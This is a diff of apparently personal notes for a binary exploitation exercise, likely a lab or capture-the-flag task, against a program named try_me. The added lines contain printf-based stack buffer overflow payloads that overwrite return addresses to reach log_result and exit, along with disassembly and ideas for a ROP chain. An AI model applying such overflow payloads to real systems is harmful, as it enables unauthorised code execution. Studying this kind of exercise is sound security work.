@@ -64,6 +64,8 @@ address of where call goes to
 
 append after the exit call
 
+./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08")"
+
 ./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08"')"
 
 ------------------------------------
@@ -103,6 +105,8 @@ address of where call goes to
 
 replace "bbbb" with address to get successful exit after create file
 
+./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08\x20\xe8\x04\x08\xde\xad\xbe\xef")"
+
 ./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08\x20\xe8\x04\x08\xde\xad\xbe\xef"')"
 
 ------------------------------------
@@ -120,12 +124,51 @@ target the sprintf in main
 8048f3a:       e8 f1 62 00 00          call   804f230 <_IO_sprintf>
 
 
-use the part 1 but target sprintf to write to buffer then goto the log_result function ?
+0x08048f2d      ff75f4         push dword [local_ch]
+0x08048f30      68ade20b08     push str.home_admin_uid__d_crack ; 0x80be2ad ; "/home/admin/uid_%d_crack"
+0x08048f35      6840bf0e08     push obj.filename           ; 0x80ebf40
+0x08048f3a      e8f1620000     call sym.sprintf            ; int sprintf(char *s, const char *format, ...)
+
+
+maybe:
+
+target sprintf to write to buffer then goto the log_result function
+would need to find a way to append "_super" to the buffer
+or
+try and push some stuff onto the stack and call open directly
+or
+maybe try to do a strcpy into filename with the input like in test, and then call the log_result
+
+main() does
+
+push int uid        // ... (extra parameters)
+push format string  // const char* format
+push string buffer  // char* s
+call sprintf
+
+log_result() does
+
+0x08048e7b      6840040000     push 0x440                  ; 1088
+0x08048e80      6840bf0e08     push obj.filename           ; 0x80ebf40
+0x08048e85      e866400200     call sym.__open
+
+
+template from part1:
+
+offset + addr of log_result + addr of exit
+
+./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08")"
+
+need to add some more to/change the shell code after this probably
 
 
 
 ------------------------------------
 
 PART4
+
+rop chain?
+
+try: shellstorm ROPGadget
 
 ------------------------------------
